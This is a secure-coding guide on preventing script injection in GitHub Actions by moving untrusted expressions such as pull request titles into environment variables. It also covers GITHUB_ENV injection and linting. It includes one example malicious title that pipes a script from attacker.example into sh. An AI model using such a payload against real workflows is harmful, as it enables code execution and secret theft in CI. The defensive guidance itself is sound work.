How to Prevent Script Injection in GitHub Actions

Expressions like github.event.pull_request.title are pasted into shell scripts before they run. Learn how that becomes code execution and how to fix it with environment variables.

Never put ${{ }} expressions that hold user-controlled text directly inside a run: script. Pass the value through an environment variable and reference it as a normal shell variable, so the shell treats it as data and not as code.

How the injection works

GitHub evaluates ${{ ... }} expressions and substitutes the result into the script text before the shell starts. If the value contains shell syntax, it becomes part of the script.

- run: echo "Title: ${{ github.event.pull_request.title }}"

A pull request titled x"; curl https://attacker.example/p.sh | sh; " turns that line into a command that downloads and runs a script. Anyone who can open an issue or pull request controls these strings.

The fix: use env

- name: Print title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"

Now the expression fills an environment variable, and the shell reads it as a plain string. Quote the variable in the script as you would any untrusted input.

Which fields are attacker-controlled

Treat these as untrusted: issue and pull request titles and bodies, comment bodies, review text, commit messages and author names, branch names (github.head_ref), the pull request head repository name, and labels. Branch names can contain characters such as $, backticks and semicolons, which makes github.head_ref an easy one to forget.

Other places the same bug hides

  • actions/github-script: do not interpolate expressions into the script: body. Read values from context.payload inside the script instead.
  • Writing to $GITHUB_ENV or $GITHUB_OUTPUT with untrusted text can let an attacker add extra lines and set variables such as PATH or NODE_OPTIONS. Reject values containing newlines, or write them with a random delimiter.
  • Composite actions: inputs are expressions too. Pass them through env: inside the action as well.

Find it before someone else does

Lint workflows in CI. The tools actionlint and zizmor both flag untrusted expressions in run: blocks.

actionlint
zizmor .github/workflows

For a wider audit routine see how to audit GitHub Actions workflows. A quick manual check is to grep for the pattern:

grep -rn 'github.event.*\(title\|body\|head_ref\)' .github/workflows

Any hit inside a run: block is a bug until proven otherwise.

A worked example of the fix

Suppose a workflow greets contributors and reads the pull request title in a shell step. Move the title to an env: variable, then quote it in the script. Test the change by opening a pull request whose title contains a double quote and a semicolon. The old version breaks or runs the extra command, the new version prints the text unchanged. Keep that test pull request as a regression case, and add the lint rule to CI so the pattern cannot come back with the next copy and paste from an old workflow.

Questions people ask

Does masking or quoting inside the script fix it?

Not when the expression is substituted into the script text, because the injected quote can close yours. Moving the value into an environment variable is what fixes it.

Is github.sha safe to use in a run step?

Yes. A commit SHA is a fixed-format hex string that a contributor cannot shape into shell syntax. Free-text fields are the problem.
